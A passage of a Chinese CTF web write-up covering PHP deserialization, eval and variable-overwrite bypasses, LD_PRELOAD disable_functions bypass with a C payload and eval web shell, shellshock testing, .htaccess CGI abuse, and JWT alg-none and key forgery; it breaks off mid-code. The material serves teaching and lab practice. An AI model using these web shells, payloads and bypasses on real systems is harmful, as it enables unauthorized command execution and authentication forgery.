class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BUU</span> </span>&#123;<br>   <span class="hljs-keyword">public</span> <span class="hljs-variable">$correct</span> = <span class="hljs-string">&quot;&quot;</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-variable">$input</span> = <span class="hljs-string">&quot;&quot;</span>;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>       <span class="hljs-keyword">try</span> &#123;<br>           <span class="hljs-keyword">$this</span>-&gt;correct = base64_encode(uniqid());<br>           <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;correct === <span class="hljs-keyword">$this</span>-&gt;input) &#123;<br>               <span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-string">&quot;/flag&quot;</span>);<br>           &#125;<br>       &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>) &#123;<br>       &#125;<br>   &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pleaseget&#x27;</span>] === <span class="hljs-string">&#x27;1&#x27;</span>) &#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pleasepost&#x27;</span>] === <span class="hljs-string">&#x27;2&#x27;</span>) &#123;<br>        <span class="hljs-keyword">if</span>(md5(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;md51&#x27;</span>]) == md5(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;md52&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;md51&#x27;</span>] != <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;md52&#x27;</span>]) &#123;<br>            unserialize(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;obj&#x27;</span>]);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>首先有unserialize参数通过POST变量obj，即参数可控，其次类已经给出，可以利用，最后，类中有魔术方法__destruct 说明这是一道考查了反序列化知识点的题</p><p>题中函数讲解：uniqid()：基于以微秒计的当前时间，生成一个唯一id</p><p>MD5的==比较，可以使用哈希比较缺陷和数组绕过</p><p>条件$this-&gt;correct === $this-&gt;input构造传引用：</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$a</span>-&gt;<span class="hljs-variable">$input</span>=<span class="hljs-variable">$a</span>-&gt;<span class="hljs-variable">$correct</span>;<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BUU</span> </span>&#123;<br>   <span class="hljs-keyword">public</span> <span class="hljs-variable">$correct</span> = <span class="hljs-string">&quot;&quot;</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-variable">$input</span> = <span class="hljs-string">&quot;&quot;</span>;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>       <span class="hljs-keyword">try</span> &#123;<br>           <span class="hljs-keyword">$this</span>-&gt;correct = base64_encode(uniqid());<br>           <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;correct === <span class="hljs-keyword">$this</span>-&gt;input) &#123;<br>              <span class="hljs-comment">//echo file_get_contents(&quot;/flag&quot;);</span><br>           &#125;<br>       &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>) &#123;<br>       &#125;<br>   &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> BUU();<br><span class="hljs-variable">$a</span>-&gt;input=&amp;a-&gt;correct;<span class="hljs-comment">//传引用</span><br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$a</span>);<br><br><span class="hljs-comment">//得到：O:3:&quot;BUU&quot;:2:&#123;s:7:&quot;correct&quot;;s:0:&quot;&quot;;s:5:&quot;input&quot;;s:0:&quot;&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p>拼接payload即可</p><h2 id="abcd"><a href="#abcd" class="headerlink" title="abcd"></a>abcd</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br>show_source(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">//$a=$_SERVER[&#x27;argv&#x27;];</span><br><span class="hljs-variable">$c</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;fun&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ygnn_bpkn&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ygnn_bpkn.COM&#x27;</span>])&amp;&amp;!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;fl0g&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?|flag|show_source|GLOBALS|echo|var_dump|print|highlight_file|GET|eval/i&quot;</span>, <span class="hljs-variable">$c</span>)&amp;&amp;<span class="hljs-variable">$c</span>&lt;=<span class="hljs-number">16</span>)&#123;<br>         <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$c</span>&quot;</span>.<span class="hljs-string">&quot;;&quot;</span>);<br>         <span class="hljs-keyword">if</span>(<span class="hljs-variable">$fl0g</span>===<span class="hljs-string">&quot;flag_give_me&quot;</span>)&#123;<br>             <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>         &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;lueluelue&#x27;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>非预期解：</p><blockquote><p>ygnn_bpkn=1&amp;ygnn[bpkn.COM=2&amp;fun=system($_POST[a])&amp;a=tac flag.php</p><p>ygnn_bpkn=1&amp;ygnn[bpkn.COM=2&amp;fun=system($_POST[a])&amp;a=tac flag2.php</p></blockquote></blockquote><p>题目本意是<code>fl0g=flag_give_me</code>输出flag，很显然<code>fl0g</code>传入的方式是GET，但是要想这样赋值前的if条件又是通过GET传入空值<code>fl0g</code> 总之这就是个死局</p><p>我们可以通过变量覆盖的方式，也是这题的考查点，利用变量c和extract()做跳板，给<code>fl0g</code>类似参数逃逸的方式赋值</p><blockquote><p>extract() 函数从数组中将变量导入到当前的符号表。</p><p>该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。</p><p>该函数返回成功设置的变量数目。</p><p>extract(<strong>array</strong>,extract_rules,prefix)</p></blockquote><blockquote><p>ygnn_bpkn=1&amp;ygnn[bpkn.COM=2&amp;fl0g=flag_give_me&amp;fun=extract($_POST)</p></blockquote><p>然后访问robots.txt</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//flag2.php</span><br>error_reporting(<span class="hljs-number">0</span>);<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$F</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;F&#x27;</span>])&#123;<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&#x27;/system|nl|tac|tee|nc|wget|exec|passthru|netcat/i&#x27;</span>, <span class="hljs-variable">$F</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(substr(<span class="hljs-variable">$F</span>,<span class="hljs-number">0</span>,<span class="hljs-number">6</span>));<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;come&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>应是环境问题，解法应该是curl -F，此处<code>?F=\`$F `;vi flag2.php</code>没有响应 尝试了其他命令也是如此</p><p>至此此题解</p><p>值得注意的是<code>$a=$_SERVER[&#39;argv&#39;];</code>被注释了，否则存在解法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;argv&#x27;</span>]当前传递给PHP程序的参数<br><span class="hljs-variable">$a</span>[<span class="hljs-number">0</span>]=<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;argv&#x27;</span>][<span class="hljs-number">0</span>];<br>当我们传值 ?<span class="hljs-variable">$fl0g</span>=flag_give_me; (一定要加上分号；)然后此时<span class="hljs-variable">$a</span>[<span class="hljs-number">0</span>]=<span class="hljs-string">&quot;<span class="hljs-subst">$fl0g</span>=flag_give_me;&quot;</span>并不是直接GET fl0g，<br>在使用<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$a</span>[<span class="hljs-number">0</span>])，来执行<span class="hljs-string">&quot;<span class="hljs-subst">$fl0g</span>=flag_give_me;&quot;</span>，达到赋值的目的<br>最后 <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$c</span>&quot;</span>.<span class="hljs-string">&quot;;&quot;</span>)<br><br>GET: ?<span class="hljs-variable">$fl0g</span>=flag_give_me;<br>POST: ygnn_bpkn=<span class="hljs-number">1</span>&amp;ygnn[bpkn.COM=<span class="hljs-number">2</span>&amp;fun=<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$a</span>[<span class="hljs-number">0</span>])<br></code></pre></td></tr></table></figure><h2 id="def"><a href="#def" class="headerlink" title="def"></a>def</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br>show_source(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-variable">$b</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br><span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br><span class="hljs-variable">$d</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;d&#x27;</span>];<br><span class="hljs-keyword">if</span>(!preg_match_all(<span class="hljs-string">&#x27;/eval|system|usort|array|include|shell_exec|exec|call|function|replace|uasort/i&#x27;</span>,<span class="hljs-variable">$a</span>))<br>&#123;<br>    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/[a-zA-Z]/&#x27;</span>,<span class="hljs-variable">$b</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;不要字母&#x27;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$f</span> = <span class="hljs-variable">$a</span>(<span class="hljs-variable">$b</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/[a-zA-Z]/&#x27;</span>,<span class="hljs-variable">$d</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;都说了不要字母&#x27;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$e</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;e&#x27;</span>];<br>        <span class="hljs-variable">$g</span> = <span class="hljs-variable">$f</span>(<span class="hljs-variable">$e</span>(<span class="hljs-variable">$d</span>));<br>        <span class="hljs-variable">$caicai</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;caicai&#x27;</span>];<br>        <span class="hljs-variable">$cc</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cc&#x27;</span>];<br>        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/abc|def|caicai|cc/&#x27;</span>,<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;h&#x27;</span>]))<br>        &#123;<br>            <span class="hljs-variable">$h</span> = <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo &#x27;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;h&#x27;</span>].<span class="hljs-string">&#x27;;&#x27;</span>);<br>        &#125;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;不要使用敏感函数&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>base_convert(<strong>number,frombase,tobase</strong>);在任意进制之间转换数字</p></blockquote><p>先说非预期解：扫目录发现<code>.DS_Store</code>，工具解开发现<code>flagaaaaaaaaaa.txt</code>，访问即可</p><h2 id="Bypass-disable-function-——-LD-PRELOAD"><a href="#Bypass-disable-function-——-LD-PRELOAD" class="headerlink" title="Bypass disable_function —— LD_PRELOAD"></a>Bypass disable_function —— LD_PRELOAD</h2><p>LD_PRELOAD是Linux系统的一个环境变量，它可以影响程序的运行时的链接（Runtime linker），它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的目的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">payload</span><span class="hljs-params">()</span> </span>&#123;<br>system(<span class="hljs-string">&quot;cat /flag &gt;&gt; /var/www/html/test.php&quot;</span>);<br>system(<span class="hljs-string">&quot;tac /flag &gt;&gt; /var/www/html/test.php&quot;</span>);<br>system(<span class="hljs-string">&quot;/readflag &gt;&gt; /var/www/html/test.php&quot;</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span>  <span class="hljs-title">geteuid</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (getenv(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>) == <span class="hljs-literal">NULL</span>) &#123; <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; &#125;<br>    unsetenv(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>);<br>    payload();<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>gcc -c -fPIC hack.c -o hack<br>gcc -shared hack -o hack.so</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;ant&#x27;</span>]);<br>  putenv(<span class="hljs-string">&quot;LD_PRELOAD=/tmp/hack.so&quot;</span>);<br>  error_log(<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-number">1</span>);<br>  mail(<span class="hljs-string">&quot;admin@localhost&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>putenv()用来改变或增加环境变量的内容. 参数string 的格式为name＝value, 如果该环境变量原先存在, 则变量内容会依参数string 改变, 否则此参数内容会成为新的环境变量.</p></blockquote><p>浏览器访问shell.php，再访问test.php,即可发现flag</p><p>利用蚁剑插件可以免去上述过程 如下题：</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210729142924840.png"></p><p>蚁剑连接</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210729143019466.png"></p><p>直接查看flag文件为空 下载文件得到没权限</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210729143920521.png"></p><p>终端始终返回127 这是运行环境和登录用户的运行环境存在差异造成的 这样设置就是权限不够</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210729143100697.png"></p><p>在蚁剑使用插件绕过disable_function，成功后可以看到 <code>/var/www/html/</code> 目录下新建了一个 <code>.antproxy.php</code> 文件</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210729154051090.png"></p><p>改用.antproxy.php连接蚁剑 即可绕过</p><h2 id="shellshock"><a href="#shellshock" class="headerlink" title="shellshock"></a>shellshock</h2><p>ShellShock,破壳漏洞，出现于2014年<br>可以通过以下命令来判断是否存在这个漏洞<br><code>env x=&#39;() &#123; :;&#125;; echo vulnerable&#39; bash -c &quot;echo this is a test&quot;</code><br>如果出现vulnerable说明存在</p><h2 id="Apache-Mod-CGI"><a href="#Apache-Mod-CGI" class="headerlink" title="Apache Mod CGI"></a>Apache Mod CGI</h2><p>需要用到.htaccess和mod_cgi</p><p>1）.htaccess</p><p>一般情况下，不应该使用.htaccess文件，除非你对主配置文件没有访问权限；.htaccess文件应该被用在内容提供者需要针对特定目录改变服务器的配置而又没有root权限的情况下。如果服务器管理员不愿意频繁修改配置，则可以允许用户通过.htaccess文件自己修改配置，尤其是ISP在同一个机器上运行了多个用户站点，而又希望用户可以自己改变配置的情况下。</p><p>2）mod_cgi</p><p>在非线程型MPM(<code>prefork</code>)上提供对CGI脚本执行的支持</p><p>任何具有MIME类型<code>application/x-httpd-cgi</code>或者被<code>cgi-script</code>处理器处理的文件都将被作为CGI脚本对待并由服务器运行，它的输出将被返回给客户端。可以通过两种途径使文件成为CGI脚本，一种是文件具有已由<code>AddType</code>指令定义的扩展名，另一种是文件位于<code>ScriptAlias</code>目录中。如果.htaccess文件被攻击者修改的话，攻击者就可以利用apache的mod_cgi模块，直接绕过PHP的任何限制，来执行系统命令</p><p>需要满足几个条件:</p><p>第一，必须是apache环境<br>第二，mod_cgi已经启用<br>第三，必须允许.htaccess文件，也就是说在httpd.conf中，要注意AllowOverride选项为All，而不是none<br>第四，必须有权限写.htaccess文件</p><p>.htaccess内容：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">Options +ExecCGI<br>AddHandler cgi-script <span class="hljs-string">.abc</span><span class="hljs-comment">#这里的.abc是构造的，表示.abc后缀的文件都会被当作cgi脚本执行</span><br><br>shell.abc<br><span class="hljs-comment">#!/bin/sh</span><br><span class="hljs-keyword">echo</span>&amp;&amp;<span class="hljs-keyword">cd</span> <span class="hljs-string">&quot;/var/www/html&quot;</span>;<span class="hljs-keyword">ls</span> -al;<span class="hljs-keyword">echo</span> [S];<span class="hljs-keyword">pwd</span>;<span class="hljs-keyword">echo</span> [E]<br></code></pre></td></tr></table></figure><p>注解：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">Options</span>指令是Apache配置文件中一个比较常见也比较重要的指令，<span class="hljs-keyword">Options</span>指令可以在Apache服务器核心配置(<span class="hljs-keyword">server</span> config)、虚拟主机配置(virtual host)、特定目录配置(directory)以及.htaccess文件中使用。<span class="hljs-keyword">Options</span>指令的主要作用是控制特定目录将启用哪些服务器特性。<br>关于<span class="hljs-keyword">Options</span>指令后可以附加的特性选项的具体作用及含义，可以参考这篇文章：http://www<span class="hljs-number">.365</span>mini.com/page/apache-<span class="hljs-keyword">options</span>-directive.htm<br>当然我们用到的就是ExecCGI选项，表示允许使用mod_cgi模块执行CGI脚本<br></code></pre></td></tr></table></figure><p>利用蚁剑的插件即可</p><h2 id="JSON-Web-Token"><a href="#JSON-Web-Token" class="headerlink" title="JSON Web Token"></a>JSON Web Token</h2><h3 id="无签名"><a href="#无签名" class="headerlink" title="无签名"></a>无签名</h3><p>一些JWT库也支持none算法，即不使用签名算法。当alg字段为空时，后端将不执行签名验证。尝试找到 flag。</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210819003224592.png"></p><p>抓包得到：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">token</span>=eyJ<span class="hljs-number">0</span>eXAiOiJKV<span class="hljs-number">1</span>QiLCJhbGciOiJIUzI<span class="hljs-number">1</span>NiJ<span class="hljs-number">9</span>.eyJ<span class="hljs-number">1</span>c<span class="hljs-number">2</span>VybmFtZSI<span class="hljs-number">6</span>IjEyMyIsInBhc<span class="hljs-number">3</span>N<span class="hljs-number">3</span>b<span class="hljs-number">3</span>JkIjoiMTIzIiwicm<span class="hljs-number">9</span>sZSI<span class="hljs-number">6</span>Imd<span class="hljs-number">1</span>ZXN<span class="hljs-number">0</span>In<span class="hljs-number">0</span>.<span class="hljs-number">1</span>HzZE_bkrgzE<span class="hljs-number">12</span>m<span class="hljs-number">27</span>Odw_bKZvGA<span class="hljs-number">4</span>ytwP<span class="hljs-number">3</span>mLXvYIsQrk<br></code></pre></td></tr></table></figure><p>可以分段base64也可以使用<a href="https://jwt.io/">https://jwt.io/</a></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210819003915180.png"></p><p>最后面的<strong>VERIFY SIGNATURE</strong>修改无法解出来，因为设置了签证为空，删除即可，直接将第二个点前的数据进行解码</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210819004041753.png"></p><p>经验，给补上一个<code>=</code></p><p>将<code>alg</code>设置为<code>none</code>，将<code>role</code>设置为<code>admin</code></p><p>得到payload：</p><blockquote><p>token=eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6IjEyMyIsInBhc3N3b3JkIjoiMTIzIiwicm9sZSI6ImFkbWluIn0.</p></blockquote><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210819011534028.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210819011621792.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210819011635058.png"></p><h3 id="弱密钥"><a href="#弱密钥" class="headerlink" title="弱密钥"></a>弱密钥</h3><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210819012520913.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210819013136910.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210819013309069.png"></p><h3 id="非对称RS256私钥生成jwt"><a href="#非对称RS256私钥生成jwt" class="headerlink" title="非对称RS256私钥生成jwt"></a>非对称RS256私钥生成jwt</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">/* GET home page. */</span><br>router.get(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res, next</span>) </span>&#123;<br>  res.type(<span class="hljs-string">&#x27;html&#x27;</span>)<br>  <span class="hljs-keyword">var</span> privateKey = fs.readFileSync(process.cwd() + <span class="hljs-string">&#x27;//public//private.key&#x27;</span>)<br>  <span class="hljs-keyword">var</span> token = jwt.sign(&#123; <span class="hljs-attr">user</span>: <span class="hljs-string">&#x27;user&#x27;</span> &#125;, privateKey, &#123; <span class="hljs-attr">algorithm</span>: <span class="hljs-string">&#x27;RS256&#x27;</span> &#125;)<br>  res.cookie(<span class="hljs-string">&#x27;auth&#x27;</span>, token)<br>  res.end(<span class="hljs-string">&#x27;where is flag?&#x27;</span>)<br>&#125;)<br>router.post(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res, next</span>) </span>&#123;<br>  <span class="hljs-keyword">var</span> flag = <span class="hljs-string">&#x27;flag_here&#x27;</span><br>  res.type(<span class="hljs-string">&#x27;html&#x27;</span>)<br>  <span class="hljs-keyword">var</span> auth = req.cookies.auth<br>  <span class="hljs-keyword">var</span> cert = fs.readFileSync(process.cwd() + <span class="hljs-string">&#x27;//public/public.key&#x27;</span>) <span class="hljs-comment">// get public key</span><br>  jwt.verify(auth, cert, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">err, decoded</span>) </span>&#123;<br>    <span class="hljs-keyword">if</span> (decoded.user === <span class="hljs-string">&#x27;admin&#x27;</span>) &#123;<br>      res.end(flag)<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      res.end(<span class="hljs-string">&#x27;you are not admin&#x27;</span>)<br>    &#125;<br>  &#125;)<br>&#125;)<br></code></pre></td></tr></table></figure><p>发现公钥私钥都在public文件夹下，下载私钥，利用私钥生成jwt</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> jwt = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;jsonwebtoken&#x27;</span>)<br><span class="hljs-keyword">var</span> 